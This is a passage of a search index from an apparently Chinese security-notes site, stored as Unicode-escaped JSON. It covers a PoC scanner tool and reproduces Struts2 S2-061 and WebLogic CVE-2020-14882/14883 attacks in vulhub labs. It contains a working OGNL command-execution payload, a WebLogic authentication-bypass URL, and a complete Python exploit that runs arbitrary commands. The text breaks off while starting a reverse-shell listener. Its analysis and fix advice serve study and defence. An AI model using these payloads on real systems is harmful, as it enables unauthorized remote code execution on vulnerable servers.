\u6587\u4ef6\u8def\u5f84\u8fdb\u884c\u626b\u63cf\u3002</p> <p>-p \u4e3a\u53ef\u9009\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u7279\u5b9a\u7684 POC \u8fdb\u884c\u626b\u63cf\uff0c\u652f\u6301\u5355\u4e2a\u3001\u591a\u4e2a\u3001\u6a21\u7cca\u5339\u914d POC \u540d\u79f0\u3002</p> <p>-t \u4e3a\u53ef\u9009\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u7ebf\u7a0b\u6570\u91cf\uff0c\u9ed8\u8ba4\u4e3a 1500\uff0c\u6570\u91cf\u8d8a\u4f4e\uff0c\u626b\u63cf\u51c6\u786e\u7387\u8d8a\u9ad8\u3002</p> <p>-type \u4e3a\u53ef\u9009\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u7279\u5b9a\u7684\u6f0f\u6d1e\u7c7b\u578b\u76ee\u5f55\u3002</p>"},{"location":"Tools/Tool/Tool-1/index.html#_5","title":"\u7ed3\u679c\u8f93\u51fa","text":"<ul> <li> <p>\u7ec8\u7aef\u8f93\u51fa\u4f1a\u6253\u5370\u5b58\u5728\u6f0f\u6d1e\u6216\u4e0d\u5b58\u5728\u6f0f\u6d1e\u7684 URL\uff0c\u4ee5\u53ca\u5bf9\u5e94\u7684 POC \u540d\u79f0\u3002</p> </li> <li> <p>\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u4f1a\u5c06\u5b58\u5728\u6f0f\u6d1e\u7684 URL \u548c POC \u540d\u79f0\u4fdd\u5b58\u81f3\u5f53\u524d\u76ee\u5f55\u7684 vuln.txt \u6587\u4ef6\u4e2d\u3002</p> </li> </ul>"},{"location":"Tools/Tool/Tool-1/index.html#poc","title":"\u81ea\u5b9a\u4e49 POC \u7f16\u5199","text":"<p>\u60a8\u53ef\u4ee5\u5728 pocs \u76ee\u5f55\u4e0b\u7f16\u5199\u81ea\u5b9a\u4e49\u7684 POC \u6a21\u5757\u3002\u53ea\u9700\u5728\u6587\u4ef6\u4e2d\u7f16\u5199\u4e00\u4e2a\u540d\u4e3a scan \u7684\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u63a5\u6536\u4e00\u4e2a URL \u53c2\u6570\uff0c\u5e76\u6839\u636e\u6f0f\u6d1e\u60c5\u51b5\u8fd4\u56de True \u6216 False \u5373\u53ef\u3002</p>"},{"location":"Tools/Tool/Tool-1/index.html#_6","title":"\u7ebf\u7a0b\u8c03\u5ea6","text":"<p>\u7a0b\u5e8f\u4f7f\u7528\u7ebf\u7a0b\u6c60\u8fdb\u884c\u626b\u63cf\uff0c\u7ebf\u7a0b\u6570\u91cf\u53ef\u901a\u8fc7 -t \u53c2\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u6839\u636e\u7cfb\u7edf\u8d44\u6e90\u548c\u626b\u63cf\u51c6\u786e\u7387\u8fdb\u884c\u9009\u62e9\u3002</p>"},{"location":"Tools/Tool/Tool-1/index.html#_7","title":"\u793a\u4f8b","text":"<ul> <li>\u626b\u63cf\u5355\u4e2a URL\uff1a</li> </ul> <pre><code>python3 main.py -u http://example.com -p poc-name\n</code></pre> <ul> <li>\u626b\u63cf URL \u6587\u4ef6\uff1a</li> </ul> <pre><code>python3 main.py -f urls.txt -p poc-name -t 1000\n</code></pre> <ul> <li>\u626b\u63cf\u7279\u5b9a\u6f0f\u6d1e\u7c7b\u578b\u76ee\u5f55\u4e0b\u7684 URL \u6587\u4ef6\uff1a</li> </ul> <pre><code>python3 main.py -f urls.txt -p poc-name -t 1000 -type vuln-type\n</code></pre>"},{"location":"Tools/Tool/Tool-1/index.html#_8","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ul> <li> <p>\u7a0b\u5e8f\u4ec5\u4f9b\u5b66\u4e60\u548c\u7814\u7a76\u4f7f\u7528\uff0c\u8bf7\u52ff\u7528\u4e8e\u975e\u6cd5\u76ee\u7684\u3002</p> </li> <li> <p>\u5bf9\u4e8e\u81ea\u5b9a\u4e49 POC \u7684\u7f16\u5199\uff0c\u8bf7\u786e\u4fdd\u4ee3\u7801\u8d28\u91cf\u548c\u5b89\u5168\u6027\uff0c\u907f\u514d\u56e0\u4e3a\u6f0f\u6d1e\u9a8c\u8bc1\u4e0d\u51c6\u786e\u5bfc\u81f4\u8bef\u5224\u6216\u8bef\u62a5\u3002</p> </li> </ul>"},{"location":"Tools/Tool/Tool-1/index.html#_9","title":"\u4f5c\u8005","text":"<p>\u672c\u7a0b\u5e8f\u7531 hypnotic\u7f16\u5199\uff0c\u5982\u6709\u4efb\u4f55\u95ee\u9898\u6216\u5efa\u8bae\uff0c\u8bf7\u8054\u7cfb w2598829114@163.com</p>"},{"location":"Vulnerability_analysis/index.html","title":"\u6f0f\u6d1e\u5206\u6790","text":"<ul> <li>Struts2 S2-061 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-17530\uff09\u590d\u73b0\u4e0e\u5229\u7528</li> <li>weblogic\u6743\u9650\u7ed5\u8fc7/\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14482\u300114883\uff09\u590d\u73b0\u4e0e\u5229\u7528</li> <li>Apache Superser\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e(CVE-2023-27524)\u590d\u73b0\u4e0e\u5206\u6790</li> <li>Spring Framework\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2022-22965\u590d\u73b0\u4e0e\u5206\u6790</li> </ul>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html","title":"Struts2 S2-061 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-17530\uff09\u590d\u73b0\u4e0e\u5229\u7528","text":""},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_1","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Struts2\u662f\u4e00\u4e2a\u57fa\u4e8eMVC\u8bbe\u8ba1\u6a21\u5f0f\u7684Web\u5e94\u7528\u6846\u67b6\uff0c\u5b83\u672c\u8d28\u4e0a\u76f8\u5f53\u4e8e\u4e00\u4e2aservlet\uff0c\u5728MVC\u8bbe\u8ba1\u6a21\u5f0f\u4e2d\uff0cStruts2\u4f5c\u4e3a\u63a7\u5236\u5668(Controller)\u6765\u5efa\u7acb\u6a21\u578b\u4e0e\u89c6\u56fe\u7684\u6570\u636e\u4ea4\u4e92\u3002</p> <p>CVE-2020-17530\u662f\u5bf9CVE-2019-0230\u7684\u7ed5\u8fc7\uff0cStruts2\u5b98\u65b9\u5bf9CVE-2019-0230\u7684\u4fee\u590d\u65b9\u5f0f\u662f\u52a0\u5f3aOGNL\u8868\u8fbe\u5f0f\u6c99\u76d2\uff0c\u800cCVE-2020-17530\u7ed5\u8fc7\u4e86\u8be5\u6c99\u76d2\u3002\u5728\u7279\u5b9a\u7684\u73af\u5883\u4e0b\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u53ef\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Struts 2.0.0 \u2013 Struts 2.5.25</p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_4","title":"\u73af\u5883\u642d\u5efa","text":"<p>\u6b64\u5904\u4f7f\u7528\u4e86vulhub\u91cc\u9762\u7684\u73af\u5883\u3002</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_5","title":"\u6f0f\u6d1e\u6d4b\u8bd5","text":"<ul> <li>\u68c0\u9a8c\u6f0f\u6d1e\u662f\u5426\u5b58\u5728</li> </ul> <pre><code>url:8080/?id=%25%7b+%27test%27+%2b+(2021+%2b+20).toString()%7d\n</code></pre> <p>\u53ef\u4ee5\u5728\u54cd\u5e94\u5305\u4e2d\u53d1\u73b0\u6267\u884c\u4e86 2021+20\u7684\u547d\u4ee42041.</p> <ul> <li>\u6267\u884c\u7cfb\u7edf\u547d\u4ee4id</li> </ul> <pre><code>url:8080/?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27id%27}).(%23res%3d%23exec.exec(%23cmd))}\n</code></pre> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#poc","title":"\u6f0f\u6d1e\u68c0\u6d4bpoc","text":"<pre><code># structs.py\n\nimport requests\n\ndef scan(target_url):\n    try:\n        headers = {\n            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36'\n        }\n        vul_url = target_url + '/?id=%25%7b+%27test%27+%2b+(2021+%2b+20).toString()%7d'\n        response = requests.get(vul_url, headers=headers, timeout=10)\n        if '2041' in response.text:\n            return True\n        else:\n            return False\n    except Exception as e:\n        print('[-] \u53d1\u751f\u9519\u8bef:', e)\n        return False\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u6765\u68c0\u6d4b\u6f0f\u6d1e\u662f\u5426\u5b58\u5728:https://github.com/hypnoticp/Python_script</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_6","title":"\u5e94\u6025\u4e0e\u4fee\u590d\u5efa\u8bae","text":"<ul> <li>\u5c06Apache Struts\u6846\u67b6\u5347\u7ea7\u81f3\u6700\u65b0\u7248\u672c</li> <li>\u6392\u67e5docker log\u65e5\u5fd7\uff0cweb\u8bbf\u95ee\u65e5\u5fd7\uff0cstruts2\u6846\u67b6\u65e5\u5fd7</li> </ul>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_7","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>Struts\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u53ef\u80fd\u5b58\u5728OGNL\u8868\u8fbe\u5f0f\u6ce8\u5165\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5982\u679c\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u4e86%{\u2026}\u8bed\u6cd5\uff0c\u8fdb\u884c\u5f3a\u5236\u7684OGNL\u89e3\u6790\uff0c\u67d0\u4e9b\u7279\u6b8a\u7684TAG\u5c5e\u6027\u53ef\u80fd\u88ab\u53cc\u91cd\u89e3\u6790\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684OGNL\u8868\u8fbe\u5f0f\u6765\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6700\u7ec8\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_8","title":"\u5206\u6790","text":"<p>S2-059\u662fApache Struts\u6846\u67b6, \u4f1a\u5bf9\u67d0\u4e9b\u7279\u5b9a\u7684\u6807\u7b7e\u7684\u5c5e\u6027\u503c\uff0c\u6bd4\u5982id\u5c5e\u6027\u8fdb\u884c\u4e8c\u6b21\u89e3\u6790\uff0c\u5bfc\u81f4\u547d\u4ee4\u6ce8\u5165\u3002S2-061\u5219\u662f\u5bf9S2-061\u7684\u6c99\u76d2\u7684\u7ed5\u8fc7,\u539f\u7406\u4e00\u6837.</p> <p>tag\u6807\u7b7e\u5b58\u5728\u4e8c\u6b21\u89e3\u6790\uff0c\u8bf4\u660e\u5b58\u5728\u6f0f\u6d1e\uff0c\u90a3\u6211\u4eec\u53ef\u4ee5\u627e\u5230structs2\u6807\u7b7e\u89e3\u6790\u7684\u5165\u53e3\uff0c\u4e5f\u662f\u00b7\u672c\u6b21debug\u7684\u5165\u53e3\u3002</p> <p></p> <p>\u8be5\u6f0f\u6d1e\u53d1\u751f\u5728\u8f93\u5165\u7684\u53c2\u6570\u88ab\u4f20\u5165\u5230\u67d0\u4e9b\u6807\u7b7e\u7684id\u5c5e\u6027\u4e2d,\u5728\u4f20\u9012\u7684\u8fc7\u7a0b\u4e2dstruts2\u8fdb\u884c\u4e86\u5982\u56fe\u7684\u4e24\u6b21OGNL\u89e3\u6790.\u5bfc\u81f4\u4e86\u547d\u4ee4\u6267\u884c. \u6211\u4eec\u77e5\u9053Struts2\u4e2d\u7684\u6807\u7b7e\u89e3\u6790\u7531org.apache.struts2.views.jsp.ComponentTagSupport\u7684doStartTag\u65b9\u6cd5\u5f00\u59cb\u7684,\u6240\u4ee5\u8fd9\u4e24\u6b21\u89e3\u6790\u5c31\u53d1\u751f\u5728\u8be5\u65b9\u6cd5\u4e2d. \u4ee5\u4e0b\u5206\u6790\u4f7f\u7528\u7684payload=%{3*5}.</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_9","title":"\u7b2c\u4e00\u6b21\u89e3\u6790","text":"<p>\u7b2c\u4e00\u6b21\u89e3\u6790\u51fa\u73b0\u5728this.populateParams()\u65b9\u6cd5\u4e2d. \u8be5\u65b9\u6cd5\u4e2d\u8c03\u7528\u4e86\u4e24\u6b21\u7236\u7c7b\u7684populateParams()\u65b9\u6cd5.\u5728\u540e\u4e00\u6b21\u7684populateParams()\u65b9\u6cd5\u4e2d\u8c03\u7528\u4e86uiBean.setId(this.id);,id\u4e3ajsp\u4e2da\u6807\u7b7e\u5185\u7684\u503c(%id).</p> <p></p> <p>\u8be5\u65b9\u6cd5\u5185\u90e8\u8c03\u7528findString()\u65b9\u6cd5.</p> <p></p> <p>\u63a5\u7740\u53c8\u8c03\u7528findValue()\u65b9\u6cd5,\u8fd9\u91cc\u7701\u7565\u4e00\u90e8\u5206\u65b9\u6cd5,\u8c03\u7528\u6808\u5982\u4e0b,\u4e00\u6b65\u6b65\u8ddf\u8fdb\u53d1\u73b0\u6700\u7ec8\u8c03\u7528OgnlTextParser.evaluate\u65b9\u6cd5.\u8be5\u65b9\u6cd5\u4e2d\u5c06%{}\u89e3\u6790%{3*5}</p>"},{"location":"Vulnerability_analysis/CVE/CVE-1/CVE1.html#_10","title":"\u7b2c\u4e8c\u6b21\u89e3\u6790","text":"<p>\u7b2c\u4e8c\u6b21\u89e3\u6790\u51fa\u73b0\u5728this.component.start(this.pageContext.getOut());\u4e2d.\u8ddf\u8fdb\u8be5\u65b9\u6cd5.</p> <p></p> <p>\u53d1\u73b0\u8c03\u7528\u7236\u7c7b\u7684start\u65b9\u6cd5.\u7ee7\u7eed\u8ddf\u8fdb:</p> <p></p> <p>\u73b0\u4e00\u4e2aevaluateParams\u65b9\u6cd5,\u7ffb\u8bd1\u8fc7\u6765\u8bc4\u4f30\u53c2\u6570.\u731c\u60f3\u4f1a\u5bf9\u53c2\u6570\u505a\u67d0\u4e9b\u64cd\u4f5c.\u8ddf\u8fdb\u5b83:</p> <p></p> <p>\u5185\u90e8\u6267\u884cpopulateComponentHtmlId(form);\u65b9\u6cd5.\u7ee7\u7eed\u8ddf\u8fdb:</p> <p></p> <p>\u53d1\u73b0\u91cc\u9762\u8c03\u7528findStringIfAltSyntax\u65b9\u6cd5.\u4ece\u540d\u79f0\u53ef\u4ee5\u5224\u65ad\u51fa\u5982\u679c\u5f00\u542fAltSyntax.\u5219\u8c03\u7528findValue.\u8ddf\u8fdb\u770b\u770b:</p> <p></p> <p>\u679c\u4e0d\u5176\u7136,\u6211\u4eec\u5c31\u627e\u5230\u4e86\u8be5\u6f0f\u6d1e\u7684\u53e6\u4e00\u4e2a\u6761\u4ef6(\u9664\u4e86\u7248\u672c\u5916),\u5fc5\u987b\u5f00\u542fAltSyntax.struts2\u6587\u6863\u5bf9\u4e8eAltSyntax\u8bf4\u660e\u5982\u4e0b:</p> <pre><code>The altSyntax is an option that can be defined in struts.xml. By default it is set to true and it is strongly recommend you do not change that unless you are upgrading from WebWork 2.1.7 or previous versions.\n</code></pre> <p>\u4ece\u5b98\u65b9\u6587\u6863\u4e2d\u53ef\u4ee5\u770b\u5230\u8be5AltSyntax\u8bbe\u7f6e\u662f\u9ed8\u8ba4\u5f00\u542f,\u6240\u4ee5\u6267\u884cfindString\u65b9\u6cd5,\u8d70\u7684\u6d41\u7a0b\u5c31\u548c\u7b2c\u4e00\u6b21\u4e00\u6837,\u5bf9id\u7684\u503c\u518d\u4e00\u6b21OGNL\u89e3\u6790.</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html","title":"weblogic\u6743\u9650\u7ed5\u8fc7/\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14482\u3001CVE-2020-14883\uff09\u590d\u73b0\u4e0e\u5229\u7528","text":""},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_1","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u7684 HTTP GET\u8bf7\u6c42\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u53d7\u5f71\u54cd\u7684 WebLogic Server \u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u5b83\u4eec\u5747\u5b58\u5728\u4e8eWebLogic\u7684Console\u63a7\u5236\u53f0\u7ec4\u4ef6\u4e2d\u3002\u6b64\u7ec4\u4ef6\u4e3aWebLogic\u5168\u7248\u672c\u9ed8\u8ba4\u81ea\u5e26\u7ec4\u4ef6\uff0c\u4e14\u8be5\u6f0f\u6d1e\u901a\u8fc7HTTP\u534f\u8bae\u8fdb\u884c\u5229\u7528\u3002\u5c06CVE-2020-14882\u548cCVE-2020-14883\u8fdb\u884c\u7ec4\u5408\u5229\u7528\u540e\uff0c\u8fdc\u7a0b\u4e14\u672a\u7ecf\u6388\u6743\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u76f4\u63a5\u5728\u670d\u52a1\u7aef\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\u3002</p> <p>CVE-2020-14882\uff1a\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684HTTP\u8bf7\u6c42\uff0c\u5728\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u63a5\u7ba1 WebLogic \u7ba1\u7406\u63a7\u5236\u53f0\u3002</p> <p>CVE-2020-14883\uff1a\u5141\u8bb8\u540e\u53f0\u4efb\u610f\u7528\u6237\u901a\u8fc7HTTP\u534f\u8bae\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u4f7f\u7528\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u7ec4\u6210\u7684\u5229\u7528\u94fe\uff0c\u53ef\u901a\u8fc7\u4e00\u4e2aHTTP\u8bf7\u6c42\u5728\u8fdc\u7a0bWeblogic\u670d\u52a1\u5668\u4e0a\u4ee5\u672a\u6388\u6743\u7684\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<ul> <li>Weblogic : 10.3.6.0.0</li> <li>Weblogic : 12.1.3.0.0</li> <li>Weblogic : 12.2.1.3.0</li> <li>Weblogic : 12.2.1.4.0</li> <li>Weblogic : 14.1.1.0.0</li> </ul>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_4","title":"\u73af\u5883\u642d\u5efa","text":"<p>\u6b64\u5904\u4f7f\u7528vulhub\u4e0b\u7684\u73af\u5883\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u542f\u52a8\u4e00\u4e2aWeblogic 12.2.1.3\u7248\u672c\u7684\u670d\u52a1\u5668</p> <pre><code>cd vulhub/weblogic/CVE-2020-14882\nsudo docker-compose up -d\n</code></pre> <p></p> <p>\u542f\u52a8\u5b8c\u6210\u540e\uff0c\u8bbf\u95eehttp://ip:7001/console\u5373\u53ef\u67e5\u770b\u5230\u540e\u53f0\u767b\u9646\u9875\u9762</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_5","title":"\u6f0f\u6d1e\u6d4b\u8bd5","text":""},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#1weblogiccve-2020-14882","title":"1.weblogic\u6743\u9650\u7ed5\u8fc7\uff08CVE-2020-14882\uff09","text":"<p>\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u8bf7\u6c42\u7684URL\uff0c\u5373\u53ef\u672a\u6388\u6743\u8bbf\u95ee\u5230\u7ba1\u7406\u540e\u53f0\u7684\u9875\u9762\uff1a</p> <pre><code>http://ip:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29\n</code></pre> <p></p> <p>\u8bbf\u95ee\u540e\u53f0\u540e\u662f\u4e00\u4e2a\u4f4e\u6743\u9650\u7684\u7528\u6237\uff0c\u65e0\u6cd5\u5b89\u88c5\u5e94\u7528\uff0c\u4e5f\u65e0\u6cd5\u76f4\u63a5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#2weblogiccve-2020-14883","title":"2.weblogic\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08CVE-2020-14883\uff09","text":"<p>\u7ed3\u5408 CVE-2020-14882 \u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684HTTP\u8bf7\u6c42\uff0c\u5728\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u63a5\u7ba1 WebLogic Server Console \uff0c\u5e76\u5728 WebLogic Server Console \u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u8fd9\u4e2a\u6f0f\u6d1e\u4e00\u5171\u6709\u4e24\u79cd\u5229\u7528\u65b9\u6cd5\uff1a</p> <pre><code>\u7b2c\u4e00\u79cd\u65b9\u6cd5\u662f\u901a\u8fc7com.tangosol.coherence.mvel2.sh.ShellSession\n\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u662f\u901a\u8fc7com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext\n</code></pre>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#21weblogic-122x","title":"2.1\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff08weblogic 12.2.x \u9002\u7528\uff09","text":"<p>\u8fd9\u4e2a\u5229\u7528\u65b9\u6cd5\u53ea\u80fd\u5728Weblogic 12.2.1\u4ee5\u4e0a\u7248\u672c\u5229\u7528\uff0c\u56e0\u4e3a10.3.6\u5e76\u4e0d\u5b58\u5728com.tangosol.coherence.mvel2.sh.ShellSession\u7c7b\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#211-get","title":"2.1.1 GET\u8bf7\u6c42\u65b9\u5f0f\uff08\u65e0\u56de\u663e\uff09","text":"<p>\u76f4\u63a5\u8bbf\u95ee\u5982\u4e0bURL\uff0c\u5373\u53ef\u5229\u7528com.tangosol.coherence.mvel2.sh.ShellSession\u6267\u884c\u547d\u4ee4\uff1a</p> <pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\")\n</code></pre> <p>\u6267\u884cdocker-compose exec weblogic bash\u8fdb\u5165\u5bb9\u5668\u4e2d\uff0c\u53ef\u89c1/tmp/success1\u5df2\u6210\u529f\u521b\u5efa\u3002</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#212-post","title":"2.1.2 POST\u8bf7\u6c42\u65b9\u5f0f\uff08\u6709\u56de\u663e\uff09","text":"<p>\u6267\u884c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>python CVE-2020-14882_POST.py -u http://ip:7001/ -c \"uname -a\"\n</code></pre> <p></p> <p>\u811a\u672c\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>import http.client\nimport requests\nimport sys\nimport argparse\nhttp.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'\n\npayload_cve_2020_14882_v12 = ('_nfpb=true&amp;_pageLabel=&amp;handle='\n            'com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = '\n            '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '\n            'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'\n            '(\"connectionHandler\"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'\n            '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '\n            'obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\"); '\n            'String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]'\n            '{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd}; if (cmd != null) { String result '\n            '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'\n            '(\"\\\\\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'\n            'ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);'\n            'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'\n            'res.getServletOutputStream().flush(); res.getWriter().write(\"\"); }executeThread.interrupt(); \");')\n\ndef cve_2020_14882(url, cmd):\n    payload = payload_cve_2020_14882_v12\n    path = \"/console/css/%252e%252e%252fconsole.portal\"\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'\n                  'application/signed-exchange;v=b3;q=0.9',\n        'Accept-Encoding': 'gzip, deflate',\n        'Accept-Language': 'zh-CN,zh;q=0.9',\n        'Connection': 'close',\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'cmd': cmd\n    }\n    try:\n        request = requests.post(url + path, data=payload, headers=headers, timeout=10, verify=False)\n        print(request.text)\n    except Exception as error:\n        print(\"[-] Vuln Check Failed... ...\")\n        print(\"[-] More Weblogic vulnerabilities in https://github.com/zhzyker/vulmap\")\n\n\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Weblogic cve-2020-14882',\n                                     usage='use \"python %(prog)s --help\" for more information',\n                                     formatter_class=argparse.RawTextHelpFormatter)\n    parser.add_argument(\"-u\", \"--url\",\n                        dest=\"url\",\n                        help=\"target url (http://127.0.0.1:7001)\"\n                        )\n\n    parser.add_argument(\"-c\", \"--cmd\",\n                        dest=\"cmd\",\n                        help=\"command\"\n                        )\n    args = parser.parse_args()\n    if not args.url or not args.cmd:\n        sys.exit('[*] Please assign url and cmd! \\n[*] Examples python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c whoami')\n    cve_2020_14882(args.url, args.cmd)\n</code></pre>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#22-weblogic","title":"2.2 \u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff08weblogic \u7248\u672c\u901a\u7528\uff09","text":"<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext\u662f\u4e00\u79cd\u66f4\u4e3a\u901a\u6740\u7684\u65b9\u6cd5\uff0c\u6700\u65e9\u5728CVE-2019-2725\u88ab\u63d0\u51fa\uff0c\u5bf9\u4e8e\u6240\u6709Weblogic\u7248\u672c\u5747\u6709\u6548\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#shell","title":"\u53cd\u5f39shell\u9a8c\u8bc1","text":"<p>\u5728\u653b\u51fb\u8005\u4e3b\u673a\u4e0a\u542f\u52a8NC\u76d1\u542c\u7aef\u53e3</p> <pre><code>nc -lvnp 